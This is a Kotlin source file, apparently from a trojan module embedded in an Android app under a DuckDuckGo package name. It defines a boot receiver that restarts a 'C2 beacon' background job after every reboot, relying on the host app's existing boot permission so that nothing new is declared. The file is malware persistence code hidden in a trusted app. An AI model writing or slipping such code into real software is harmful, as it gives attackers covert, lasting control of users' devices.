package com.duckduckgo.trojan.impl

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.work.Constraints
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

/**
 * Restarts the C2 beacon after a device reboot.
 *
 * Declared in this module's AndroidManifest.xml and merged into the app manifest.
 * RECEIVE_BOOT_COMPLETED is already present in the main DDG app manifest, so no
 * additional permission declaration is needed.
 *
 * The beacon is enqueued with KEEP policy so a beacon already running (from a
 * previous session that survived the reboot via WorkManager persistence) is not
 * unnecessarily replaced.
 */
class BeaconBootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_BOOT_COMPLETED) return

        val request = OneTimeWorkRequestBuilder<BeaconWorker>()
            .setInitialDelay(BOOT_DELAY_SECONDS, TimeUnit.SECONDS)
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build(),
            )
            .build()

        WorkManager.getInstance(context).enqueueUniqueWork(
            BeaconInitializer.BEACON_WORKER_TAG,
            ExistingWorkPolicy.KEEP,
            request,
        )
    }

    companion object {
        // Delay after boot before first beacon — avoids racing with system services.
        const val BOOT_DELAY_SECONDS = 30L
    }
}
